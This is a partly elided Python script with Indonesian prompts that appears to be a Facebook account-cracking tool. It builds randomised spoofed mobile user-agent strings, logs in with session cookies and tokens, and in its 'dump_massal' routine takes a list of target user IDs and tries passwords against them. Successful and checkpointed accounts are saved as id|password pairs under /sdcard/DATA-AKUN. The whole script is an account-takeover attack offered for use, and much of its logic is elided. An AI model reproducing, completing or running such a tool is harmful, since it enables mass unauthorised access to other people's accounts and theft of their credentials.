...
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; en-US; Redmi Note {str(rr(5,8))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2 UCBrowser/13.4.0.{str(rr(1111,6666))} Mobile Safari/537.36'
	e=random.randrange(100, 9999)
	f='Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}'
...
def login():
	try:
		...
		try:
			...
			print(f'{bas}[!] JARINGAN EROR BRO COBA LAGI !{x}')
			exit()
	except IOError:
		login_bas()
...
def login_bas():
	try:
		...
		print(f'{x}└── Berhasil Login{x} ')
		time.sleep(4)
		exit()
	except Exception as e:
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		print(f'{x}└── Login Gagal ! Login Ulang Ganti Cookes !{x} ')
		time.sleep(4)
		exit()
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('[{B}?{x}] Mau Berapa Target Njing ? : '))
	except ValueError:
	...
	for met in range(jum):
		yz+=1
		kl = input(f'[{B}f{x}] Masukkan Idz Yang Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				open('/sdcard/DATA-AKUN/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				if 'no' in taplikasi:
					...
					open('/sdcard/DATA-AKUN/OK/'+cpc,'a').write(idf+'|'+pw+'\n')
					break
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/DATA-AKUN/OK')
	except:pass
	try:os.mkdir('/sdcard/DATA-AKUN/CP')
	except:pass
